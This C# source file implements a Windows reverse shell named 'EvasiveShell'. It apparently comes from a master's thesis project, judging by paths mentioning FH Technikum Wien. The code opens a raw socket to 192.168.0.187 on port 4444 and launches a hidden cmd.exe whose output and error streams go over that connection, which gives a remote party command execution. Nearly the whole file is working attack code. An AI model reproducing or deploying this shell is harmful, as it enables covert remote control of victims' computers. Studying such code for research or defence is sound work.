namespace EvasiveShell
{
  using System.Net.Sockets;
  using System.Runtime.InteropServices;
  using Win32Imports;
  using static Win32Imports.DllImportsBase;

  public class Program : DllImportsBase
  {
    public static void Main(string[] args)
    {
      Helpers.InitializeWSA();

      var sockAddrIn = new sockaddr_in();
      sockAddrIn.sin_family = 2;
      sockAddrIn.sin_port = htons(4444);
      Helpers.PrintLastError(nameof(htons));

      sockAddrIn.sin_addr.S_addr = inet_addr("192.168.0.187");
      Helpers.PrintLastError(nameof(inet_addr));

      var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
      Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);

      var sockAddr = Marshal.PtrToStructure<sockaddr>(sockAddrInPtr);

      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
      Helpers.PrintLastError(nameof(WSASocketA));

      var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddr));
      Marshal.StructureToPtr(sockAddr, addrPointer, false);
      var connectSuccess = connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
      Helpers.PrintLastError(nameof(connect));

      using (var outputStream = File.OpenWrite(@"F:\FH_Technikum_Wien\Masterarbeit\IPC\output.txt"))
      using (var inputStream = File.OpenRead(@"F:\FH_Technikum_Wien\Masterarbeit\IPC\input.txt"))
      {
        SetStdHandle(StdHandle.STD_INPUT_HANDLE, inputStream.SafeFileHandle.DangerousGetHandle());
        Helpers.PrintLastError(nameof(SetStdHandle));
        SetStdHandle(StdHandle.STD_OUTPUT_HANDLE, outputStream.SafeFileHandle.DangerousGetHandle());
        Helpers.PrintLastError(nameof(SetStdHandle));

        var socketHandle = new SafeSocketHandle(socket, false);
        STARTUPINFO startupInfo = new STARTUPINFO();
        Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
        startupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;
        startupInfo.hStdInput = inputStream.SafeFileHandle.DangerousGetHandle();
        startupInfo.hStdOutput = socketHandle.DangerousGetHandle();
        startupInfo.hStdError = socketHandle.DangerousGetHandle();
        PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
        CreateProcessA(null, @"C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
        Helpers.PrintLastError(nameof(CreateProcessA));

        while (true)
          Thread.Sleep(10);
      }
    }
  }
}